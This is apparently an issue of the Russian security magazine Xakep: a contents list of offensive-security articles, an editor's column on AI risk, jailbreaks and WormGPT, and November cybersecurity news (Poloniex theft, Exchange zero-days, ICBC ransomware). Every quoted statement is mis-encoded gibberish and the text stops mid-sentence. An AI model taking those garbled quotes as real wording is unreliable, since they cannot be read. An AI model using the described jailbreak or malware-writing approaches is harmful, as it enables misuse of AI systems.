
            № 296
CONTENTS


    ЧертGPT
  Колонка главреда

    MEGANews
  Самые важ ные события в мире инфосека за ноябрь

    Апгрейды для шелл-кода
  Изучаем инстру менты обхода анти вирусов и EDR

    Локальная картошка
  Исследуем уязвимость в локальной аутен тификации Windows

    Абьюз сессий Windows по-новому
  Получа ем билеты TGT методом GIUDA

    Злой отладчик
  Изучаем новый спо соб обхо да AMSI в Windows

    Магия SSPI
  Достаем учет ные дан ные Windows, не тро гая LSASS

     Ethernet Abyss VIP
  Пен тестим Ethernet по всем правилам

    Беззащитная защита
  Изучаем уязвимость, дающую встроить бэкдор в FortiGate

    Большая охота
  Практикуемся в Threat Hunting

     Tunnels Nightmare
  Исполь зуем провайдер ские про токо лы для пивотин га

    HTB Download
  Перехватыва ем терминал супер пользователя при атаке на хост

    HTB Topology
  Эксплуатируем LaTeX-инъ екцию для дос тупа к серверу

    HTB Sandworm
  Выходим из песочницы Firejail и повыша ем привиле гии в Linux

    HTB Gofer
  Эксплуатируем path hĳacking в связке с use after free

    Береги голову
  Как хакнуть свой орга низм, что бы жить лучше

    Титры
  Кто дела ет этот журнал
HEADER





Последний прорыв в области искусс твен-
ного интеллек та мож но сравнить с появ-
лением   пер сональных    компьютеров,
интерне та  или  мобиль ных  телефо нов.
Но прош лые революционные  тех нологии       Андрей Письменный                                                                                      Главный редактор
ник то  не  думал  ограничивать,   тогда         apismenny@gmail.com
как любые разговоры об ИИ сра зу соп-
ровож даются сом нениями: не выйдет ли
вдруг беды?


Тре воги можно поделить на два типа. Первый связан с тем, что ученые
вот-вот изобретут AGI, или «сильный ИИ», то есть равный челове ку, а значит,
и потенциально спо собный превзой ти его в умственных задачах. Последс-
твия это го неп редсказуемы. Второй тип волнений более насущный, он свя зан
с  тем,  что ИИ уже сейчас может научить людей плохому. Например,
что-нибудь взла мывать.
   Главными алармиста ми в теме сильного ИИ сейчас выступают Элиезер
Юдковский и его еди номышленники с сайта LessWrong. Юдковский — автор
занятной идеи о том, что дай силь ному ИИ задачу делать, например, скреп-
ки — и он может ненароком пустить на скрепки и нас со всей пла нетой вмес-
те. То, что между ChatGPT и воображаемым максимизатором скрепок есть
серьезная разница в возможностях, не мешает Юдковскому нагонять панику
уже сей час.
   Го ворили, что именно к таким опасениям мог прислушиваться соос-
нователь и глав ный научный сотрудник OpenAI Илья Суцкевер. Именно он
стал катали зато ром в недавнем скандале, когда совет директоров OpenAI
ненадол го уво лил ген директора компании Сэма Альтмана. Тот сле дом чуть
не увел за собой всех сотрудников в Microsoft, где для них тут же широко рас-
пахнули две ри.





                 Сэм Альтман и Илья Суцкевер

Из вестно, что за несколь ко дней до неожидан ного увольнения Альтма на Илья
Суцкевер вы ражал сом нения в том, что компания работает над искусствен-
ным интеллектом «дос таточно безопасно».
  По сообщению Reuters со ссылкой на аноним ные источники в компании,
при чиной  всей  кутерьмы  было  недавнее  изобретение  версии  GPT
под кодовым названием Q*. Имея достаточно вычислительных ресур сов, она
может решать математические задачи «на уровне младшеклассника» (сейчас
даже GPT-4 иногда путается в воп росах о том, сколь ко у кого яблок, не говоря
уже о чем-то более сложном). Вряд ли это заветный сильный ИИ, но оче ред-
ной важный шажок на пути к нему.
  Позже Суцкевер сказал, что «глу боко сожалеет о своем учас тии в действи-
ях совета дирек торов», а также подписался под требованием вернуть Альтма-
на. Тре бование подкреплялось угро зой уйти вслед за ним в Microsoft.
  А еще Суц кевер незадолго до смуты выс тупил на TED и зву чал скорее
оптимистично. Он, хоть и признал, что «на каждое положительное примене-
ние сильного ИИ появится по отрицательному», закончил на позитив ной ноте:
наше понимание проблематики будет раз виваться вместе с технологией. То
есть люди нап рягутся и уж как-нибудь да научат ся извле кать из ИИ больше
поль зы, чем вреда.
  Думаю, если у Суцкевера и были раз ногласия с Альтманом, то скорее
о том, как вести дела. Откры вать или не откры вать наработки, стремиться
к зарабатыванию денег или нет, превращать вещи вроде Q* в новый релиз
или обож дать, взять время на их всесторонний анализ.
  Однако промед ление и утаивание в таких ситуациях тоже повод для кри-
тики. Почему сотрудники OpenAI, заяв ляя, что тру дятся на бла го всего
человечества, не откры вают свои наработки? Подход цукербергов ской Meta
AI (по умол чанию коммерческой) сейчас куда бли же к заявленным ценностям
нон про фита OpenAI. Последнюю модель «Меты» Llama 2 можно пойти и ска-
чать, в отличие от GPT-3 или -4, которые дос тупны лишь через платный API.
   Это под водит нас ко вто рой теме — раз говору о возможности исполь-
зовать боль шие язы ковые модели для пакостничества и о необходимос ти
цензуриро вать их вых лоп.
  За при мерами зло действ далеко ходить не нуж но. «Джейлбрейк», сво-
дящий ся  к  очень  настойчивому  промт-инжинирингу,  иногда  поз воля ет
добиться ответов на скользкие темы даже от ChatGPT.
  При желании нынешние языковые модели мож но использовать и для
социаль ной инженерии, и даже для вирусописательства. Например, на-
шумев ший недавно WormGPT, по сло вам его создателя, «позволяет легко
написать вредоносный скрипт на Rust, и тот в 99% слу чаев пройдет проверку
боль шинством антивиру сов».





WormGPT осно ван на опен сорсной языковой модели GPT-J 6B, соз данной
в EleutherAI в качестве конкурента GPT-3. Тре нировать новые язы ковые
модели сей час тяжело: нуж ны хорошо отоб ранные и раз меченные данные
и масса вычислительных ресурсов. Одна ко, как мы видим, не невозможно,
и дальше будет толь ко легче.
  А еще проще этим занимать ся, когда ты миллионер с и без того противо-
речи вой репутацией. Как нап ример, Илон Маск, анонсировавший запуск сво-
ей новой компании xAI и языковой модели Grok. Маск, ныне склоняющийся
к аме риканским консерваторам, озабочен левац кой цензурой и излишней
«политкорректностью», которыми OpenAI и Meta наделяют свои модели.
   Grok, в отли чие от сво их более приличных сородичей, может хамить
и материть ся, а также рассказывать, как изготовить кокаин (хоть и не очень
под робно). О том, может ли Grok писать малварь (и нас колько качественно),
Маск не обмолвился. Про верить пока тоже нельзя — приглашения при ходят
только избран ным.





             Grok сравнива ет масшта биро вание ИИ с оргией

Маск счи тает, что цензурировать вывод ИИ неэтично, глу по и потенциаль но
опасно. Его оппоненты счи тают, что íå цензуриро вать вывод ИИ — неэтич но,
глупо и потенциаль но опасно. Надо сказать, все это мало отли чается
от более широкой дискуссии о том, нужно ли огра ничивать доступ к информа-
ции, и если да, то каковы критерии. ИИ здесь лишь еще один повод поднять
все те же извечные вопросы.
  Для нас тем временем куда продук тивнее не размышлять о том, нужно
запретить ИИ или нет, а готовиться жить в мире, где эта технология будет
существовать во всех возможных видах — легально или под поль но. Обратно
в бутылку это го джинна уже не вернуть.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: у Poloniex укра ли 130 миллионов долларов,
Сэма Бэнкмана-Фрида признали винов ным по всем пун ктам
обвинения, разработ чики Tor Project удалили из сети мно-
жество узлов, шифровальщик ата ковал крупнейший банк
Китая, вымогатели пишут жалобы властям, Роскомнадзор
будет блокиро вать про токол Shadowsocks и другие интерес-
ные события ноября.
ОГРАБЛЕНИЕ
POLONIEX





Не известные  хакеры   похитили   у  криптовалютной  биржи   Poloniex
более 100 миллионов долларов США в Ethereum, Bitcoin и Tron. Руководство
ком пании предложило злоумыш ленникам вернуть  украденные средства,
оставив себе 5% в качес тве наг рады.
   Атака произош ла в середине ноября, и представители платформы заяви-
ли, что планируют пол ностью возместить убытки всем, кто пос традал из-за
слу чившегося. Основатель Tron Джастин Сан, которому в настоящее вре мя
при надлежит Poloniex, под черкнул, что платформа по-прежнему «находится
в хорошем финансовом положении и полностью возместит пострадавшим
все средства».
   Точ ная сумма украденных средств неиз вестна и оценива ется исследова-
теля ми  по-раз ному. К  при меру,  специалисты  PeckShield  заявили,  что
у Poloniex укра ли около 125 миллионов долларов, включая ETH на 56 мил-
лионов дол ларов, TRX на 48 миллионов долларов и BTC на 18 мил лионов дол-
ларов. В свою оче редь, аналитики SlowMist подсчитали, что общий ущерб
пре вышает 130 миллионов долларов, так как во время инцидента были
похищены и менее ценные коины, общая сто имость которых сос тавляет мил-
лионы долларов.
   Вскоре после атаки пред ставители Poloniex опуб ликовали официальное
обращение к хакерам, в котором предложили им награду в размере 5%
от украденных акти вов в обмен на возврат всех средств.


     «Ìû ïðîñèì âàñ îòâå òèòü íà ýòî ïðåä ëîæåíèå â òå÷åíèå áëèæàéøèõ
     ñåìè äíåé, ïðåæäå ÷åì ìû ïðèâ ëå÷åì ïðà âîîõðàíèòåëüíûå îðãà íû, —«
      ïèñàëè ïðåä ñòà âèòå ëè ïëàòôîðìû. — Êðîìå òîãî, ìû èçó ÷àåì âîç-
     ìîæíîñ òè ñîòðóäíè÷åñ òâà ñ äðó ãèìè ïàð òíå ðàìè äëÿ îáëåã÷å íèÿ âîç-
      âðà òà ñðåäñòâ».                »
По хоже, эта тактика не сработа ла, так как поз же на адреса, связанные с этим
взло мом, было отправ лено новое сообщение. Кошель ки Джастина Сана ини-
цииро вали шестнадцать транзакций, каж дая сто имостью 0,10 доллара США
в Ethereum, содер жащих одно и то же послание на нескольких языках.





В сообщении компания заявляет, что уста нови ла личность хакера, но все
еще дает ему воз можность вернуть украден ные средс тва. Если злоумыш-
ленник не сде лает этого, правоохранительные органы Китая, Рос сии и США,
уже вовлеченные в расследование, перейдут к активным действиям.
   Также бир жа подчеркну ла, что похищенные акти вы в любом случае прис-
тально отслеживаются и использовать их вряд ли получится. При этом ком-
пания по-прежнему готова предоставить хакеру «white hat награду» в раз-
мере 10 миллионов долларов США, если он вернет украденное.


ОМОГЛИФЫ ИСПОЛЬЗУЮТСЯ В 11 РАЗ ЧАЩЕ

Аналити ки  ком пании  FAССT  зафиксировали  резкий  рост  количества  попыток  обой ти
антиспам-решения с помощью омог лифов — графичес ки одинако вых или похожих друг на дру га
сим волов во вредоносных рас сылках.





В треть ем квартале 2023 года количес тво подоб ных писем в 11 раз превыси ло показатели ана-
логич ного пери ода прош лого года. Самыми популяр ными подменными буквами у киберпрес-
тупни ков стали Е, О, С, А.

СОФТ ДЛЯ ОБХОДА
БЛОКИРОВОК
ИСЧЕЗАЕТ С GITHUB





Бо лее 20 инструмен тов, пред назначен ных для обхо да «Великого китай ского
файрвола» и других блокиро вок, были удалены с GitHub в этом месяце. Мно-
гие полагают, что китайско му правительству удалось деано ними зировать
раз работ чиков этих утилит и ока зать на них давление, добившись удаления.
  Все инструменты пропали из сети 2 и 3 ноября, что навело экспертов
на мысли о некой коор динации со сто роны их раз работчиков или властей.
  Одним из первых с GitHub исчез популярный прокси-инс тру мент Clash For
Windows, который помогал пользователям обходить брандма уэры и китай-
скую систему блокировок. При этом репози торий был основным способом
загрузки Clash для поль зователей и основным каналом для обновлений
со стороны разработчика.
  Подобные инс трумен ты выступа ют в роли шлюза между устрой ством поль-
зователя и интернетом, обеспечивая при ватный дос туп к сети за счет мас-
кировки IP-адреса пользователя. В пос ледние годы они ста ли популяр ной
аль тернативой VPN в Китае, так как еще в 2017 году пра вительство страны
ста ло активно бороться с использовани ем VPN.
  Фак тичес ки теперь VPN в Китае легальны лишь в том случае, если соот-
ветствуют определенным правилам обра бот ки данных, что значительно пов-
лияло на их распространение и использование, а некоторые крупные плат-
формы (нап ример, Apple) и вовсе закрыли дос туп к VPN в стране.
  Впрочем, прок си-серверы все еще менее популярны, чем VPN, число
поль зовате лей которых в Китае оценива лось примерно в 293 миллиона
человек по состоянию на 2021 год.
  После удаления репозитория соз датель Clash, известный под ником
Fndroid, написал в X (быв ший Twitter), что разработ ка утилиты прек ращена,
не объяснив, почему принял такое решение.

      «Ïðåê ðàòèë îáíîâëå íèÿ, äî ñêîðîé âñòðå ÷è. Òåõíîëîãèè íå áûâà þò
     õîðîøèìè èëè ïëîõèìè, íî ëþäè áûâà þò. Ïðèø ëî âðå ìÿ îáðà òèòüñÿ«
       ê ñâå òó è äâèãàòüñÿ äàëüøå», — íàïèñàë Fndroid.                »
Вско ре после этого сопутствующие инстру менты из экосистемы Clash, под-
держиваемые другими разработчиками на GitHub (например, Clash Verge,
Clash for Android, ClashX), и другие прок си-инстру менты тоже ста ли уда ляться
или архивиро вать ся без объяснения при чин.
  При этом прос мотр официального списка запросов на удаление на GitHub
не дал никакого результата, то есть офи циальных зап росов на уда ление этих
инструментов от китайских властей не поступало.
  Неожи данное исчезно вение Clash for Windows из сети породи ло множес-
тво слухов о том, что китайское правитель ство каким-то обра зом вычислило
создателя инс трумента и оказало на него давление.
  К тому же другой разработчик прокси, извес тный под ником EAimTY, тоже
удалил свой репози торий TUIC и опуб ликовал сооб щение в блоге, где намек-
нул, что к про исходяще му имеют отношение власти.
  Нес мотря на то что мно гие инс трумен ты боль ше недос тупны для установ-
ки, некоторые из них, включая Clash, пока еще работают в сис темах поль-
зователей, хотя и перестали получать обновления.
  Интересно, что ранее в этом месяце Китай начал новый виток борь бы
с ано нимностью в интернете.
   Так, китай ское правительство постановило, что любой онлайн-аккаунт
в социальных сетях, имеющий боль ше 500 тысяч подписчиков, должен содер-
жать настоящее имя вла дель ца.





Разработ чики Google обновили статистику текущей рас пространенности версий Android. Ока-
залось, всего за год с небольшим Android 13 стала самой рас пространен ной версией ОС
и теперь занима ет долю рынка в 22,4%.

При этом на втором мес те рас положилась не Android 12, как мож но было бы подумать,
а Android 11, которая исполь зуется на 21,6% активных устройств и опережает Android 12,
на счету которой 15,8% девайсов.

Судя по  всему,  успех  Android 13  связан  с выпус ком боль шего  количества  устройств
под управлением этой версии ОС, а также с обновле ниями, вышедшими для мно гих бюджетных
Android-смартфонов.

ИЗ TOR УДАЛИЛИ
РЯД УЗЛОВ





Пос ле того как из сети Tor уда лили множес тво узлов, команда Tor Project объ-
яснила свое решение тем, что узлы пред ставляли угрозу для безопас ности
всех пользовате лей. Ока залось, операто ры некоторых ретрансля торов учас-
тво вали в «высокорискован ной криптовалютной схе ме, обе щающей денеж-
ную выгоду» и не получали на это одоб рение со стороны Tor Project.
   Ретрансляторы в сети Tor представляют собой узлы маршрутизации,
которые помогают анонимизировать тра фик в сети Tor, принимая и передавая
зашифрованные данные сле дующему узлу. В основном ими управляют волон-
теры  и  энтузиасты,  неравнодушные  к  вопросам  конфиденциальнос ти,
безопасности, анонимности и сво боды информации в интерне те.
   Удаление множества узлов из сети вызвало в сообщес тве жаркие дис-
куссии о правилах исполь зования рет рансляторов, а также о том, что явля-
ется наруше нием, а что нет. Поэто му разработ чики решили объ яснить свои
дей ствия.
   Как сообщили в бло ге представители Tor Project, недавно выяснилось, что
некоторые опе раторы ретрансляторов были связаны с некой высокорис-
кованной  крип товалютной  схемой.  А  использование  ретрансляторов
для получе ния прибыли противоречит доб ровольчес ким принципам волон-
теров, которые борются с цензурой и слежкой в сети.
  К тому же, если ком мерческая составля ющая обретет серьезный масштаб
и поглотит значительную часть ретран сляторов в сети Tor, власть из рук сооб-
щества перей дет в руки сомнительных лиц, а безопас ность всей сети будет
подорвана агрессивной центра лиза цией.

     «Ìû ñ÷èòàåì òàêèå ðåòðàíñëÿòîðû âðåä íûìè äëÿ ñåòè Tor ïî ðÿäó
      ïðè÷èí, â òîì ÷èñ ëå ïîòîìó, ÷òî íåêîòîðûå èç íèõ íå ñîîòâåòñ òâó þò«
     íàøèì òðå áîâà íèÿì, à òàê æå ïîòîìó, ÷òî ïîäîáíûå ôèíàíñîâûå ñõå-
     ìû ïðåäñòàâ ëÿþò çíà ÷èòåëüíóþ óãðîçó äëÿ öåëîñ òíîñ òè ñåòè è ðåïóòà-
      öèè íàøåãî ïðîåêòà. Âåäü îíè ìîãóò ïðèâ ëå÷ü çëîóìûø ëåííèêîâ, ïîä-
      âåð ãíóòü ïîëüçîâàòå ëåé ðèñ êó èëè íàðóøèòü äîáðîâîëü÷åñ êèé  äóõ,
      ïîääåðæèâàþùèé ñîîáùåñ òâî Tor», — ïèøóò ðàç ðàáîò÷èêè.                »
Также отме чалось, что мно гие из операто ров отклю ченных узлов подвергали
себя риску, даже не зная о проекте, в который вносили свой вклад. Другие
запускали ретран сляторы в небезопасных реги онах и регионах с повышен-
ным риском.
  Никакой конкретики о потенциально опасной коммерческой схе ме раз-
работ чики Tor не привели, однако в коммента риях к посту можно найти
информацию о том, что заб локированные узлы были свя заны с проектом ATor
(AirTor) и их таких насчитывалось около тысячи. Однако эта информация
не подтвержде на офи циально.
  Соз датели  ATor утвер ждают, что цель проекта — улучшить сеть  Tor
с помощью воз награждений, которые вып лачивают в криптовалюте ATor опе-
рато рам ретран сляторов. После пуб ликации заявления разработчиков Tor
стоимость ATor резко упала ниже одного доллара США.


БИЛЛ ГЕЙТС О ВЛИЯНИИ ИИ





Билл Гейтс при нял учас тие в под касте Тревора Ноа «What Now?», и во вре мя беседы Ноа поин-
тересовался у создателя Microsoft, что тот дума ет о потен циальной угрозе, которую ИИ пред-
став ляет для рабочих мест. Гейтс ответил, что бла годаря ИИ может наступить время, когда
людям «не придется так много работать».

          «Если в кон це концов мы получим общес тво, в котором придет ся работать→       только три дня в неделю, то это, наверное, нор мально», — заявил Гейтс.


Ранее миллиар дер уже посвятил возможным проб лемам, связанным с ИИ, большую статью
в своем блоге. Там он признавал опас ность его неп равильного исполь зования, однако тоже
сох ранял опти мизм.

         «Не думаю, что влияние ИИ окажется столь же драматичным, как промыш-→       ленная революция, но оно, безус ловно, будет таким же значительным, как появ-
       ление ПК. Текстовые процес соры не избавили нас от офисной работы, но изме-
       нили ее навсегда. Работодателям и сот рудникам пришлось адаптироваться,
      и они это сделали», — писал Гейтс.

БАГИ В EXCHANGE
ОСТАЛИСЬ
БЕЗ ПАТЧЕЙ





В Trend Micro Zero Day Initiative (ZDI) предуп редили, что Microsoft Exchange
под вержен сразу четырем уяз вимостям нулевого дня, которые хакеры могут
использовать для выполнения про извольного кода или раскрытия конфиден-
циальной информации. При этом инженеры Microsoft сочли, что уязвимости
недос таточ но серьезны, и отло жили патчи для них на потом.
  Проблемы были выявлены спе циалис тами ZDI еще в сентябре 2023 года,
и, хотя в Microsoft признали их наличие, в компании не посчитали их достаточ-
но серьезными. Эксперты ZDI не согласились с этой оценкой и решили обна-
родовать информа цию о  багах,  чтобы пре дупредить администраторов
Exchange о воз можных рисках.
   ZDI-23-1578: RCE-уязвимость в клас се ChainedSerializationBinder, свя зан-
ная с тем, что поль зовательские данные не проверяются над лежащим обра-
зом, в результате чего злоумыш ленники могут десериализовать недове рен-
ные данные. Успешная эксплуатация позволяет выполнить произвольный код
с правами SYSTEM.
   ZDI-23-1579:  уязвимость  в  методе  DownloadDataFromUri,  связанная
с недос таточной проверкой URI перед доступом к ресур су. Злоумышленни ки
могут исполь зовать ее для получения доступа к конфиденциаль ной информа-
ции с сер веров Exchange.
   ZDI-23-1580: уязвимость в методе DownloadDataFromOﬃceMarketPlace
также связана с неправильной про веркой URI и может привести к несанкци-
онированному раскрытию информации.
   ZDI-23-1581:  баг, присутству ющий в методе  CreateAttachmentFromUri,
похож на пре дыдущие, поскольку некор ректно проверяет URI, что тоже чре-
вато раскры тием кон фиденциальных данных.
  Для экс плуатации этих багов требуется аутентифика ция, что снижает их
серьезность (от 7,1 до 7,5 балла по шка ле CVSS). Вероятно, именно поэтому
Microsoft решила не уделять приоритетное вни мание исправ лению этих оши-
бок.
  Тем не менее в ZDI отмечают, что не сто ит счи тать перечисленные выше
проблемы малозначимы ми, особен но ZDI-23-1578 (RCE), которая может при-
вести к пол ной компромета ции системы.
  Иссле дователи предложили единственную стра тегию защиты — огра-
ничить взаимо действие с при ложениями Exchange. Одна ко это может ока-
заться неприем лемым для многих предприятий и организа ций, исполь-
зующих этот продукт.
  Представите ли Microsoft прокомментирова ли ситу ацию следующим обра-



     «Ìû âûñîêî öåíèì ðàáîòó òåõ, êòî ñîîáùèë îá ýòèõ ïðîáëåìàõ â ðàì-
       êàõ  ñêîîðäèíèðîâàííîãî  ðàñ êðû òèÿ èíôîðìà öèè  îá  óÿç âèìîñ òÿõ,зом:«
      è ãîòîâû ïðèíÿòü íåîáõîäèìûå ìåðû äëÿ çàùèòû ïîëüçîâàòå ëåé.
      Ìû ðàñ ñìîòðåëè ñîîáùåíèÿ èññëå äîâà òåëåé è ïðèø ëè ê âûâîäó,
      ÷òî ýòè ïðîáëåìû ëèáî óæå óñòðà íåíû, ëèáî íå îòâå ÷àþò òðå áîâà íèÿì
      äëÿ íåìåä ëåííîãî ðåàãèðîâà íèÿ, â ñîîòâåòñ òâèè ñ íàøèìè ïðà âèëà ìè
      êëàñ ñèôèêà öèè  ñåðüåçíîñòè  (óÿç âèìîñ òåé). Ìû  ñîîòâåòñ òâó þùèì
      îáðà çîì ðàñ ñìîòðèì âîç ìîæíîñòü èõ óñòðà íåíèÿ â áóäóùèõ âåð ñèÿõ
      ïðîäóê òîâ è îáíîâëå íèÿõ».                »
Кро ме того, Microsoft предоставила дополнительную информа цию по каж-
дому из обнаруженных специалис тами багов:
 • ZDI-23-1578 — поль зователи, установив шие августов ские обновления
   безопасности, уже защище ны;
 • ZDI-23-1581 — опи санная техника атак требует от злоумышленника пред-
   варительного доступа к учет ным дан ным электронной почты, и не было
   пред став лено никаких доказа тельств того, что проб лема может исполь-
   зовать ся для повыше ния привилегий;
 • ZDI-23-1579 — описанная методи ка атак требует от злоумышленника
   пред варительного доступа к учетным данным электронной почты;
 • ZDI-23-1580 — описанная методи ка атак требует от злоумышленни ка
   пред варительного доступа к учетным данным электронной почты, и не
  было представ лено никаких доказа тельств того, что проб лема может
   исполь зоваться для получения дос тупа к конфиденциальной информации
  о кли енте.


БОТЫ В ИНТЕРНЕТ-ТРАФИКЕ

Специалисты Arkose Labs проана лизировали активность мил лиардов ботов за период с января
по сен тябрь 2023 года. Некоторые из ботов выпол няют полезные функции, например индекси-
руют интернет, но большинство созданы для вре доносных целей.

По оценкам исследователей, 73% всего интернет-тра фика сос тавляют вредонос ные боты.





Основные категории атак ботов: создание фальшивых учетных записей, зах ват учет-
ных записей, скрап пинг, управление учетными записями и злоупотребление раз-
личными продук тами.


Об ласти, в которых наб люда ется наиболь ший рост атак, — это мошенничес тво с использовани-
ем SMS-пла тежей (рост на 2141%), управление учетными записями (рост на 160%) и создание
поддель ных учет ных записей (рост на 23%).





В пятер ку ведущих отраслей, на которые нап равле ны атаки ботов, входят технологи ческая (на
ботов приходит ся 76% тра фика), игровая (29% тра фика), социальные сети (46% тра фика),
элек тронная ком мерция (65% тра фика) и финансовые услуги (45% трафика).





                                     Продолжение статьи →
← Начало статьи
 БАНК ICBC СТАЛ
 ЖЕРТВОЙ
 ШИФРОВАЛЬЩИКА





  Промыш ленный и коммерческий банк Китая (ICBC), крупнейший коммерчес-
  кий банк Китая и один из круп нейших банков мира, стол кнулся с вымогатель-
  ской атакой. Инцидент повлиял на работу рынка казначей ских облигаций
  США и вызвал проблемы с клирингом. По данным СМИ, атака началась
  еще вечером 8 нояб ря 2023 года.
    Первым о кибератаке сообщило издание Financial Times. Об инциденте
   ста ло известно благода ря уведом лению, которое Ассоциация сек тора цен-
  ных бумаг и финан совых рынков (SIFMA) разослала своим членам после того,
   как возникли проблемы с проведением некоторых сде лок на рын ке каз начей-
   ских обязательств США.
    Собственные источники изда ния утвержда ют, что за атакой на банк стояла
  известная вымогатель ская хакгруппа LockBit.
     Вскоре пос ле ата ки банк уведомил нес кольких клиентов о том, что из-за
  проблем с кибербезопасностью будет вынужден перенаправить некоторые
  сдел

       «Ìû çíà åì îá èíöèäåíòå ñ êèáåð áåçîïàñ íîñòüþ è íàõîäèì ñÿ â ïîñ-
         òîÿííîì êîíòàêòå ñ êëþ ÷åâû ìè ó÷àñ òíèêàìè ôèíàíñîâîãî ñåê òîðà,  ки.«
         à òàê æå ñ ôåäåðàëüíûìè ðåãóëèðóþùèìè îðãà íàìè. Ìû ïðîäîëæàåì
         ñëå äèòü çà ñèòó àöèåé», — çàÿâèë æóð íàëèñ òàì ïðåäñòà âèòåëü Ìèíèñ-
         òåðñ òâà ôèíàíñîâ ÑØÀ.                 »
  В свою оче редь, исследова тели из vx-underground процитировали экстрен-
  ное уведом ление, разос ланное трей дерам:

        «Â íàñ òîÿùåå âðå ìÿ ICBC íå ìîæåò ïîä êëþ ÷èòüñÿ ê DTCC/NSCC.
        Ïðîáëåìà  çàòðàãèâà åò  âñåõ êëèåíòîâ ICBC ïî êëèðèíãó, âêëþ ÷àÿ «
          (censored). Â ñâÿçè ñ ýòèì (censored) âðå ìåííî ïðèîñòà íàâ ëèâà åò âñå
         âõîäÿùèå FIX-ñîåäèíåíèÿ è â äàííûé ìîìåíò íå ïðèíèìà åò çàÿâ êè.
      Ìû íàõîäèì ñÿ â òåñ íîì êîíòàêòå ñ ICBC è ñîîáùèì, êàê òîëüêî ïðîá-
        ëåìà áóäåò ðåøåíà».                 »
  Хотя сам Промышленный и коммерческий банк Китая не выступил с офи-
  циальным заяв лени ем, многочисленные источники сообщили, что про изошла
  именно атака шиф роваль щика.
     К при меру, известный ИБ-специалист Кевин Бомонт (Kevin Beaumont)
   писал, что принадлежащий банку сервер Citrix, в последний раз замеченный
   в сети незадол го до атаки, не был защищен от активно эксплуатируемой
  хакерами уязвимос ти  Citrix Bleed (CVE-2023-4966), которая затрагивает
   NetScaler ADC и NetScaler Gateway. Теперь этот сервер уже недоступен.


         «Ýòà  óÿç âèìîñòü ïîç âîëÿåò ïîëíîñòüþ îáîéòè âñå ôîð ìû  àóòåí-
        òèôèêà öèè è èñïîëüçóåòñÿ âûìîãà òåëüñêèìè ãðóï ïàìè. Ýòî òàê æå «
        ïðîñ òî, êàê íàâåñ òè êóð ñîð è ïðîê ëèêàòü ñåáå äîðîãó âíóòðü îðãà íèçà-
         öèè. Çëîóìûø ëåííèêè ïîëó÷à þò ïîëíîñòüþ èíòå ðàê òèâíûé Remote
         Desktop PC íà äðó ãîì êîíöå», — îáúÿñíÿåò Áîìîíò.                 »

 МОШЕННИЧЕСКИХ САЙТОВ НА РОССИЙСКОМ ХОСТИНГЕ
  СТАЛО Â 2 ÐÀÇÀ МЕНЬШЕ
   По данным FAССT, за первые три квартала 2023 года было обнаружено 10 000 фишинговых
   сайтов, нацеленных на пользователей из России. Хотя общее количество таких ресурсов
   вырос ло на 5%, специалис ты заметили мас совый исход фишин говых сай тов от рос сий ских
   хос тинг-провайдеров на сер веры в Нидерландах и США.

   Так, общее количес тво фишинговых сайтов, для размещения которых исполь зовались россий-
   ские серверы, сократилось на 53%, а доля мошен ничес ких ресур сов, которые размещались
   у рос сийских хос теров, упа ла с 73 до 41%. Эксперты полагают, что это связано с успе хами
   детектирова ния и блокировок мошеннических сайтов ком петен тны ми организациями и регуля-
   тора ми.

 ОПЕРАТОРЫ
 BLACKCAT
 ЖАЛУЮТСЯ ВЛАСТЯМ





  Вымогатели из груп пировки BlackCat (ALPHV) выводят шантаж на новый уро-
   вень: хакеры подали жалобу в Комиссию по ценным бумагам и биржам США
   (SEC), сообщив властям, что одна из их жертв не соблюдает правило четырех
  дней и не раскры ла информацию о кибератаке.
     Хакеры заявили, что 7 ноября 2023 года они про никли в сеть разрабаты-
  вающей ПО ком пании MeridianLink и похити ли дан ные, не зашифровав сис-
  темы.
    По словам представителей груп пировки, возможно, MeridianLink пыталась
  связаться с ними, но хакеры не получили сообщений от компании и не смогли
  договориться о вып лате выкупа в обмен на непуб ликацию украденных данных.
     Отсутствие реакции со стороны компании побудило зло умышленников
  оказать еще боль шее давление на жер тву, и они направили жалобу в Комис-
  сию по ценным бумагам и биржам США, уведомив власти о том, что
   MeridianLink не раскрыла информацию об инци денте, который зат ронул «дан-
  ные клиентов и опе ративную информа цию».
     Чтобы подкрепить свои заявления фактами, вымогатели опубликовали
  на своем сайте скрин шот формы, которую они заполнили на сайте SEC. Они
  сообщили SEC, что MeridianLink под верглась «серьезной атаке», но не рас-
  крыла информацию об этом инциден те, как того тре бует форма 8-K в соот-
   ветствии с параграфом 1.05.
     Также опе раторы BlackCat опубликова ли на своем сайте и автоматичес кий
   ответ, полученный от SEC, информирующий о том, что их заявление принято.





  Де ло в том, что после многочисленных атак на американские организации
  SEC приняла новые правила, сог ласно которым ком пании, чьи акции торгуют-
  ся на бир же, обязаны уве дом лять власти о киберинцидентах, оказыва ющих
  существенное влияние на их работу (то есть могущих повлиять на инвести-
  ционные решения). Такое уве домление в SEC компании должны подавать
   в течение четырех рабочих дней с момента обна руже ния инцидента и приз-
  нания его существен ным. Однако стоит отметить, что новые правила всту-
  пают в силу только 15 декаб ря 2023 года.
    В беседе со СМИ предста вители MeridianLink подтвердили факт атаки
  и сообщили, что пос ле обнаружения инцидента компания незамедлительно
  при няла меры для локализации угрозы и привлекла к рас следова нию группу
   сторонних ИБ-экспертов.
    Компания добавила, что в нас тоящее вре мя продол жает рас сле дование,
  которое должно показать, затронула ли ата ка личную информа цию поль-
  зователей, и в случае необходимости уве домит об этом пострадавшие сто-



        «Â  ðåçóëüòàòå  ïðîâåäåííîãî  ðàñ ñëå äîâà íèÿ ìû  íå  îáíà ðóæèëè
         íèêàêèõ äîêàçà òåëüñòâ íåñàíêöèîíèðîâàííîãî äîñ òóïà ê íàøèì ïðî-   роны.«
         èçâîäñ òâåííûì ïëàòôîðìàì, è ýòîò èíöèäåíò ïðèâåë ëèøü ê íåç-
         íà÷èòåëüíûì ñáîÿì â [íàøåé] ðàáîòå», — ïîä÷åð êíó ëè â MeridianLink.                 »

  АТАК НА РОССИЙСКИЕ КОМПАНИИ СТАЛО НА 16%
 БОЛЬШЕ

   По дан ным ГК «Солар», российские ком пании в пос ледние месяцы стол кну лись с новой вол ной
   точечных и прод винутых атак. Так, в третьем квартале рост чис ла подтвержденных инциден тов
   сос тавил 16%, и сум марно за третий квартал эксперты зафиксировали 10 200 подтвержден-
   ных атак. Пред посылок для снижения этого тренда в ближай шее время исследователи не видят.





                            Количество подтвержденных ИБ-инцидентов


   Мал варь стала самым популярным инструмен том у хакеров — доля инциден тов с исполь зовани-
